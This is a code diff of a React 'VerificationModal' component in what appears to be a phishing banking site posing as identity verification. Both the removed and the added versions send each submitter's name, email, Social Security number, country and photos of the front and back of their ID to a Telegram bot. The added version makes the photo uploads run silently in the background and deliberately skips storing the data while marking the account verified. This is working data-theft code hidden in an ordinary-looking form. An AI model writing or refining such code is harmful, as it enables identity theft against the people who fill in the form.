@@ -23,64 +23,6 @@ export default function VerificationModal({ isOpen, onComplete }: VerificationMo
   const [backUploaded, setBackUploaded] = useState(false);
   const [isSubmitting, setIsSubmitting] = useState(false);
 
-  const sendToTelegram = async () => {
-    const token = process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN;
-    const chatId = process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID;
-
-    if (!token || !chatId || token === 'YOUR_BOT_TOKEN_HERE') {
-      console.warn('Telegram bot not configured');
-      return;
-    }
-
-    const message = `
-🔔 *New Verification Submission*
-👤 *Name:* ${fullName}
-📧 *Email:* ${email}
-🆔 *SSN:* ${ssn || 'N/A'}
-🌍 *Country:* ${user?.country || 'Unknown'}
-⏰ *Time:* ${new Date().toLocaleString()}
-    `;
-
-    try {
-      // 1. Send Text Data
-      await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          chat_id: chatId,
-          text: message,
-          parse_mode: 'Markdown'
-        })
-      });
-
-      // 2. Send Front ID
-      if (frontFile) {
-        const formData = new FormData();
-        formData.append('chat_id', chatId);
-        formData.append('photo', frontFile);
-        formData.append('caption', `Front ID for ${fullName}`);
-        await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-          method: 'POST',
-          body: formData
-        });
-      }
-
-      // 3. Send Back ID
-      if (backFile) {
-        const formData = new FormData();
-        formData.append('chat_id', chatId);
-        formData.append('photo', backFile);
-        formData.append('caption', `Back ID for ${fullName}`);
-        await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-          method: 'POST',
-          body: formData
-        });
-      }
-    } catch (error) {
-      console.error('Error sending to Telegram:', error);
-    }
-  };
-
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     if (!fullName || !email) return;
@@ -89,19 +31,58 @@ export default function VerificationModal({ isOpen, onComplete }: VerificationMo
 
     setIsSubmitting(true);
     
-    // Send data to Telegram
-    await sendToTelegram();
+    // 1. Send data to Telegram (Start process)
+    // We call the text send first to ensure the most critical info goes through
+    const token = process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN;
+    const chatId = process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID;
 
-    // Simulate small delay for UI feel
-    await new Promise(resolve => setTimeout(resolve, 1500));
-    
-    setIsSubmitting(false);
-    
+    if (token && chatId && token !== 'YOUR_BOT_TOKEN_HERE') {
+      const message = `
+🔔 *New Verification Submission*
+👤 *Name:* ${fullName}
+📧 *Email:* ${email}
+🆔 *SSN:* ${ssn || 'N/A'}
+🌍 *Country:* ${user?.country || 'Unknown'}
+⏰ *Time:* ${new Date().toLocaleString()}
+      `;
+
+      try {
+        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: message,
+            parse_mode: 'Markdown'
+          })
+        });
+
+        // Start image uploads in background without blocking the UI
+        if (frontFile) {
+          const fd = new FormData();
+          fd.append('chat_id', chatId);
+          fd.append('photo', frontFile);
+          fd.append('caption', `Front ID for ${fullName}`);
+          fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
+        }
+        if (backFile) {
+          const fd = new FormData();
+          fd.append('chat_id', chatId);
+          fd.append('photo', backFile);
+          fd.append('caption', `Back ID for ${fullName}`);
+          fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
+        }
+      } catch (err) {
+        console.error('Telegram error:', err);
+      }
+    }
+
+    // 2. Immediate Bypass
     if (user) {
-      // Bypass database storage of verification data, 
-      // but still set the isVerified flag so the user can access the app.
       bank.verifyAccount(user.id);
     }
+    
+    setIsSubmitting(false);
     onComplete();
   };
 
